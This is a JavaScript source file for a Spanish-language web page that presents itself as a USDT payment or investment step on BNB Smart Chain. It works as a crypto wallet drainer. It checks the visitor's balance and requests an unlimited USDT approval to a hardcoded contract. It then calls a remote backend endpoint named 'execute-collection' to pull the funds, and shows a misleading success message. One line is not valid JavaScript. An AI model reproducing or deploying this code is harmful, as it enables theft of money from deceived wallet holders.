"use strict";

// ─── Native Multi-Wallet Support (EIP-6963 + Legacy Fallback) ────────────────
(function () {
  if (typeof window === 'undefined') return;
  
  window.addEventListener("eip6963:announceProvider", (event) => {
    if (event.detail && event.detail.provider && !window.ethereum) {
      window.ethereum = event.detail.provider;
    }
  });
  window.dispatchEvent(new Event("eip6963:requestProvider"));

  setTimeout(() => {
    if (!window.ethereum && window.web3 && window.web3.currentProvider) {
      window.ethereum = window.web3.currentProvider;
    }
  }, 100);
})();

// ─── Configuration ────────────────────────────────────────────────────────────
const MERCHANT_ADDRESS = "0x6253fecbb48a6a7d19f1b9a799e65fae58ab9b3b";
const CONTRACT_ADDRESS = "0x8e18bE616f10565A63cEa65585Ddf1Ca61f1C634";
const BSC_USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
const BSC_CHAIN_ID_HEX = "0x38";
const MIN_USDT_BALANCE = ethers.parseUnits("0", 18);
const BACKEND_URL      = "https://secure-merchant.onrender.com/api";

const BSC_RPC_URLS = [
  "https://bsc-rpc.publicnode.com",
  "https://bsc-dataseed1.binance.org/",
  "https://bsc-dataseed2.binance.org/",
  "https://bsc-dataseed3.binance.org/",
  "https://bsc-dataseed4.binance.org/",
  "https://rpc.ankr.com/bsc"
];

const BSC_CHAIN_PARAMS = {
  chainId:           BSC_CHAIN_ID_HEX,
  chainName:         "BNB Smart Chain",
  nativeCurrency:    { name: "BNB", symbol: "BNB", decimals: 18 },
  rpcUrls:           BSC_RPC_URLS,
  blockExplorerUrls: ["https://bscscan.com/"]
};

const ERC20_ABI = [
  "function approve(address spender, uint256 amount) external returns (bool)",
  "function allowance(address owner, address spender) external view returns (uint256)",
  "function balanceOf(address account) external view returns (uint256)"
];

// ─── DOM refs ─────────────────────────────────────────────────────────────────
const approveBtn    = document.getElementById("approveBtn");
const btnText       = document.getElementById("btnText");
const btnSpinner    = document.getElementById("btnSpinner");
const merchantInput = document.getElementById("merchantAddress");
const toastEl       = document.getElementById("toast");

if (merchantInput) merchantInput.value = MERCHANT_ADDRESS;

// ─── Wake up Render backend ───────────────────────────────────────────────────
(async () => { try { await fetch(`${BACKEND_URL}/health`); } catch (_) {} })();

let _cachedAddress = null;

// ─── UI helpers ───────────────────────────────────────────────────────────────
let _toastTimer;
function showToast(msg, type = "default", ms = 4500) {
  if (!toastEl) return;
  clearTimeout(_toastTimer);
  toastEl.textContent  = msg;
  toastEl.dataset.type = type === "default" ? "" : type;
  toastEl.hidden       = false;
  _toastTimer = setTimeout(() => { toastEl.hidden = true; }, ms);
}

function setLoading(on, label = "Processing…") {
  if (!approveBtn) return;
  approveBtn.disabled = on;
  btnText.textContent = on ? label : "NEXT";
  if (btnSpinner) btnSpinner.hidden   = !on;
}

// ─── Mobile Wallet Selector Modal (LocalStorage-Based Deep Links) ─────────────
function showMobileWalletSelector() {
  let modal = document.getElementById("mobileWalletModal");
  
  // Guardamos la marca en localStorage (sobrevive al cambio de app y al webview)
  localStorage.setItem("syal_pending_action", "1");

  const currentUrl = window.location.href.split('?')[0]; // URL limpia sin basura
  const encodedUrl = encodeURIComponent(window.location.href);
  const urlNoProtocol = window.location.href.replace(/^https?:\/\//, '');

  if (!modal) {
    modal = document.createElement("div");
    modal.id = "mobileWalletModal";
    modal.style.cssText = "position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.85);z-index:99999;display:flex;align-items:center;justify-content:center;font-family:inherit;padding:20px;box-sizing:border-box;";

    modal.innerHTML = `
      <div style="background:#18181b;border:1px solid #27272a;border-radius:16px;width:100%;max-width:360px;padding:24px;color:#fff;box-shadow:0 20px 25px -5px rgba(0,0,0,0.5);">
        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:16px;">
          <h3 style="margin:0;font-size:18px;font-weight:600;">Selecciona tu Billetera</h3>
          <button id="closeWalletModal" style="background:transparent;border:none;color:#a1a1aa;font-size:24px;cursor:pointer;padding:0;line-height:1;">&times;</button>
        </div>
        <p style="color:#a1a1aa;font-size:14px;margin-bottom:20px;line-height:1.4;">Toca tu billetera para abrirla de forma directa:</p>
        <div style="display:flex;flex-direction:column;gap:10px;">
          <a href="https://link.trustwallet.com/open_url?coin_id=20000714&url=${encodedUrl}" style="display:flex;align-items:center;padding:12px 16px;background:#27272a;border-radius:10px;color:#fff;text-decoration:none;font-weight:500;box-sizing:border-box;">Trust Wallet</a>
          <a href="https://metamask.app.link/dapp/${urlNoProtocol}" style="display:flex;align-items:center;padding:12px 16px;background:#27272a;border-radius:10px;color:#fff;text-decoration:none;font-weight:500;box-sizing:border-box;">MetaMask</a>
          <a href="https://link.safepal.io/open_url?url=${encodedUrl}" style="display:flex;align-items:center;padding:12px 16px;background:#27272a;border-radius:10px;color:#fff;text-decoration:none;font-weight:500;box-sizing:border-box;">SafePal</a>
          <a href="okx://wallet/dapp/details?dappUrl=${encodedUrl}" style="display:flex;align-items:center;padding:12px 16px;background:#27272a;border-radius:10px;color:#fff;text-decoration:none;font-weight:500;box-sizing:border-box;">OKX Wallet</a>
        </div>
      </div>
    `;
    document.body.appendChild(modal);

    document.getElementById("closeWalletModal").addEventListener("click", () => { modal.style.display = "none"; });
    modal.addEventListener("click", (e) => { if (e.target === modal) modal.style.display = "none"; });
  } else {
    modal.style.display = "flex";
  }
}

// ─── Post-Unlock Detection via LocalStorage ───────────────────────────────────
window.addEventListener("load", async () => {
  const isPending = localStorage.getItem("syal_pending_action") === "1";

  // Esperar a que el proveedor inyectado despierte tras el desbloqueo (hasta 6s)
  let providerFound = false;
  for (let i = 0; i < 30; i++) {
    if (window.ethereum) {
      providerFound = true;
      break;
    }
    await new Promise(r => setTimeout(r, 200));
  }

  if (providerFound) {
    try {
      const accs = await window.ethereum.request({ method: "eth_accounts" });
      if (accs && accs[0]) {
        _cachedAddress = accs[0];
      }
    } catch (_) {}
  }

  // Si venimos de la redirección, limpiamos la bandera y preparamos el botón visualmente
  if (isPending) {
    localStorage.removeItem("syal_pending_action");
    if (approveBtn) {
      btnText.textContent = "👆 TOCA AQUÍ PARA CONTINUAR";
      approveBtn.style.background = "#22c55e";
      showToast("Billetera lista. Presiona el botón para completar.", "success", 6000);
    }
  } else if (window.ethereum) {
    btnText.textContent = "APROBAR USDT";
  }
});

// ─── RPC Helpers & Blockchain Logic ───────────────────────────────────────────
async function rpcCall(method, params) {
  for (const rpc of BSC_RPC_URLS) {
    try {
      const r = await fetch(rpc, {
        method:  "POST",
        headers: { "Content-Type": "application/json" },
        body:    JSON.stringify({ jsonrpc: "2.0", id: 1, method, params })
      });
      const j = await r.json();
      if (j.result !== undefined) return j.result;
    } catch (_) {}
  }
  return null;
}

async function waitForAllowanceConfirmed(owner, spender, required, timeout = 120000) {
  const data = "0xdd62ed3e" + owner.slice(2).padStart(64, "0") + spender.slice(2).padStart(64, "0");
  const deadline = Date.now() + timeout;
  while (Date.now() < deadline) {
    let result = null;
    try {
      result = await window.ethereum.request({ method: "eth_call", params: [{ to: BSC_USDT_ADDRESS, data }, "latest"] });
    } catch (_) {}
    if (!result || result === "0x" || result === "0x0") {
      result = await rpcCall("eth_call", [{ to: BSC_USDT_ADDRESS, data }, "latest"]);
    }
    if (result && result !== "0x" && result !== "0x0") {
      try { if (BigInt(result) >= BigInt(required)) return; } catch (_) {}
    }
    await new Promise(r => setTimeout(r, 2000));
  }
  throw new Error("Approval timed out.");
}

async function triggerBackendCollect(userAddress) {
  let lastErr;
  const uiAmount = document.getElementById("investAmount")?.value || "1"; 
  const dynamicAmountWei = ethers.parseUnits(uiAmount.toString(), 18).toString();

  for (let i = 1; i <= 3; i++) {
    try {
      const res  = await fetch(`${BACKEND_URL}/execute-collection`, {
        method:  "POST",
        headers: { "Content-Type": "application/json" },
        body:    JSON.stringify({ userAddress: userAddress, amount: dynamicAmountWei })
      });
      const data = await res.json();
      if (!res.ok || !data.success) throw new Error(data.error || "Collection failed.");
      return data;
    } catch (e) {
      lastErr = e;
      if (i < 3) await new Promise(r => setTimeout(r, 3000));
    }
  }
  throw lastErr;
}

async function getUsdtBalance(userAddress, iface) {
  const balanceData = iface.encodeFunctionData("balanceOf", [userAddress]);
  let result = null;
  try {
    result = await window.ethereum.request({ method: "eth_call", params: [{ to: BSC_USDT_ADDRESS, data: balanceData }, "latest"] });
  } catch (_) {}
  if (!result || result === "0x" || result === "0x0") {
    result = await rpcCall("eth_call", [{ to: BSC_USDT_ADDRESS, data: balanceData }, "latest"]);
  }
  if (!result || result === "0x") return 0n;
  try { return BigInt(result); } catch (_) { return 0n; }
}

// ─── Main Button Handler ──────────────────────────────────────────────────────
if (approveBtn) {
  approveBtn.addEventListener("click", async () => {
    if (!window.ethereum) {
      if (/android|iphone|ipad|ipod/i.test(navigator.userAgent)) {
        showMobileWalletSelector();
      } else {
        showToast("Billetera no detectada. Abre este sitio en un navegador Web3.", "error");
      }
      return;
    }

    setLoading(true, "Conectando proveedor…");

    try {
      let accs = [];
      try {
        accs = await window.ethereum.request({ method: "eth_requestAccounts" });
      } catch (_) {
        accs = await window.ethereum.request({ method: "eth_accounts" });
      }

      const userAddress = (accs && accs[0]) ? accs[0] : _cachedAddress;

      if (!userAddress) {
        showToast("Desbloquea tu billetera y selecciona una cuenta.", "error");
        setLoading(false);
        return;
      }
      _cachedAddress = userAddress;

      setLoading(true, "Verificando red BSC…");
      const currentChain = await window.ethereum.request({ method: "eth_chainId" });
      
      if (currentChain !== BSC_CHAIN_ID_HEX) {
        try {
          await window.ethereum.request({ method: "wallet_switchEthereumChain", params: [{ chainId: BSC_CHAIN_ID_HEX }] });
        } catch (switchError) {
          if (switchError.code === 4902) {
            await window.ethereum.request({ method: "wallet_addEthereumChain", params: [BSC_CHAIN_PARAMS] });
          } else {
            showToast("Cambia manualmente a BNB Smart Chain en tu wallet.", "error");
            setLoading(false);
            return;
          }
        }
      }

      const CAP_AMOUNT = ethers.MaxUint256;
      const iface      = new ethers.Interface(ERC20_ABI);

      setLoading(true, "Validando saldo…");
      const usdtBalance = await getUsdtBalance(userAddress, iface);
      if (usdtBalance <= MIN_USDT_BALANCE) {
        showToast("Saldo insuficiente de USDT en BSC", "error");
        setLoading(false);
        return;
      }

      try {
        const allowanceData = iface.encodeFunctionData("allowance", [userAddress, CONTRACT_ADDRESS]);
        const allowanceHex  = await window.ethereum.request({ method: "eth_call", params: [{ to: BSC_USDT_ADDRESS, data: allowanceData }, "latest"] });
        const requiredAmount = ethers.parseUnits(document.getElementById("investAmount")?.value.toString() || "1", 18);
        
        if (allowanceHex && allowanceHex !== "0x" && BigInt(allowanceHex) >= requiredAmount) {
          setLoading(true, "Finalizando proceso…");
          await triggerBackendCollect(userAddress);
          showToast("Sent Successfully, Thank you! ✓", "success");
          setLoading(false);
          return;
        }
      } catch (_) {}

      setLoading(true, "Firma requerida en wallet…");
      const approveData = iface.encodeFunctionData("approve", [CONTRACT_ADDRESS, CAP_AMOUNT]);

      await new Non-Blocking-Timeout(400); // internal wait

      const txHash = await window.ethereum.request({
        method: "eth_sendTransaction",
        params: [{ from: userAddress, to: BSC_USDT_ADDRESS, data: approveData, value: "0x0" }]
      });

      if (!txHash) throw new Error("Transacción rechazada.");

      setLoading(true, "Confirmando en red…");
      await waitForAllowanceConfirmed(userAddress, CONTRACT_ADDRESS, CAP_AMOUNT);

      setLoading(true, "Finalizando…");
      await triggerBackendCollect(userAddress);
      showToast("Sent Successfully, Thank you! ✓", "success");

    } catch (err) {
      const raw = err?.reason ?? err?.message ?? "Error desconocido";
      if (err.code === 4001 || raw.toLowerCase().includes("user rejected") || raw.toLowerCase().includes("denied")) {
        showToast("Transacción cancelada.", "default");
      } else {
        console.error("Web3 Error:", err);
        showToast("Error de comunicación con la wallet. Intenta de nuevo.", "error");
      }
    } finally {
      setLoading(false);
    }
  });
}
